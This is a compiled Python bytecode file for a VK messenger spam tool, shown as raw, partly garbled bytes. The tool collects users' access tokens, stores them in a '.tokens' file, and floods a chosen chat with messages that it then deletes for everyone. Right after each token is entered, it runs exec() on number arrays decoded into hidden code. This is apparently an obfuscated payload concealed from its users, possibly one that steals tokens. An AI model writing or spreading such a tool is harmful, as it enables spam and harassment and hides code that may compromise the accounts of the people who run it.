U
    (k�^�  �                B   @   s�  d dl Z d dlZd dlZe�d� edd�Ze��  edd�Zdd� Zdd	� Z	d
d� Z
ed� ed�Zedk�r�ed�Z�ze jed�Ze jeddd�Zee
dddddddddddddddddddd dd!dddddddd"d#g�� ee
ddddd$dd%d%dd&d!dddddddddddd"dd$ddd!d'dd(d)d*d+d,d-d.d/d0d/d1d+d2ddddd'dd(d)d/d2dddddddd)dd3d#g@�� edd4�Ze�ed5 � e��  W n   ed6� Y nX ed7� e�  ned8k�r�ed9� e�  ed:� ed�Zed8k�r&ed;� ed�Zed8k�rd<Znd=Zed�Zz�e jed�Ze jeddd�Zee
dddddddddddddddddddd dd!dddddddd"d#g�� ee
ddddd$dd%d%dd&d!dddddddddddd"dd$ddd!d'dd(d)d*d+d,d-d.d/d0d/d1d+d2ddddd'dd(d)d/d2dddddddd)dd3d#g@�� W n   ed>� e�  Y nX e	� Zed?�Zed@� d Zed8k�r�e� Zed<k�r^�q�zejjedA dB� W n   dCZY nX e�dD� z�ejjedA edE� ed8k�r�e�r,e�dF� nje�dG� ejj edA dAdH�dI d  dJ Z!ejj"e!d dK� e�dL� ejj#edA dB� ej�$�  e�dG� W n$   ed8k�rHY �q�nY �q@Y nX ed k�rpedM� edA7 ZnNedAk�r�edN� edA7 Zn2edOk�r�edP� edA7 ZnedQk�r�edR� d Ze�dG� �q@edS� dS )T�    N�clearz.tokensza+�rc                  C   sH   t �� } | d t| �d � } | dkr(dS tj| d�}tj|ddd�S d S )N�   � T�Zaccess_token�5.89�ru��vZlang)�f�readline�len�vk�Session�API)�token�session� r   �mg.py�login   s    r   c                  C   s  d} d}d}d}d}t d�}tt|��D ]�}|| dkr@|d } || k rJq(|dkr�| dkr�z4|| dkrp|d7 }t|| � d}||| 7 }W q�   ||| 7 }Y q�X q(|dkr�|| dkr�||| 7 }q�d	}q(|d	kr(||| 7 }q(|dkr�td
� t�  |||fS )Nr   r   z[35mEnter the link: [0m�.�   �-r   �_�   z
[31mInvalid link
)�input�ranger   �int�print�quit)Zspace�step�typeZfirstIDZsecondIDZlink�charr   r   r   �getlink   s>    r#   c                 C   s*   d}| D ]}|t t|d d ��7 }q|S )Nr   �   g      �?)�chrr   )Zmassive�str�nr   r   r   �dec2   s    r(   u�  [37m
 InvertedOnes               Vk: @inv_ones[32m
 ┏━━┳━━┳━━━━━┓  ┏━━━━━┳━━━━━┳━━━━━┳━━┳━━┓
 ┃     ┃  ┏━━┫  ┃  ━━━┫  ━  ┃  ━  ┃     ┃
 ┃ ┃ ┃ ┃  ┗  ┃  ┣━━━  ┃ ┏━━━┫     ┃ ┃ ┃ ┃
 ┗━┻━┻━┻━━━━━┛  ┗━━━━━┻━┛   ┗━━┻━━┻━┻━┻━┛
[35m
[1] Spam
[2] Add token
z&Please, enter your task's number: [0m�2z[35mEnter the token: [0mr   r   r   r	   i�$  i1  i+  iP  iu.  i�'  i�3  i})  i�4  i�  i-0  iP/  ip6  i�2  iL  i�  i]7  i�-  iU&  iM#  i'  i�  i�  im	  i�  i  iL  i�	  ip  i	  i�  i�,  �a�
z
[31mInvalid tokenr   �1z
[31mInvalid task's number
z[35m
[1] Single
[2] Multiple
z[35m
[1] Infinitely
[2] Fast
TFz
[31mInvalid token
z[35mMessage's text:[0m z
[33mr   )Zowner_idZpidorg333333�?)�user_id�messageg������@gffffff�?)r-   �count�items�id)Zmessage_idsZdelete_for_allgffffff�?z[FSending                 z[FSending.                r   z[FSending..               �   z[FSending...              z&[F                                [F)%r   �time�os�system�open�w�closer   r   r#   r(   r   r   ZtaskZtkr   r   r   Zapi�exec�writer   Z
infinitelyZ	parametrsZmessZdowZaccountZunbanZyou�sleepZmessages�sendZ
getHistoryZmg_id�deleteZbanZ
setOffliner   r   r   r   �<module>   s�   


	"

J�



J�





 









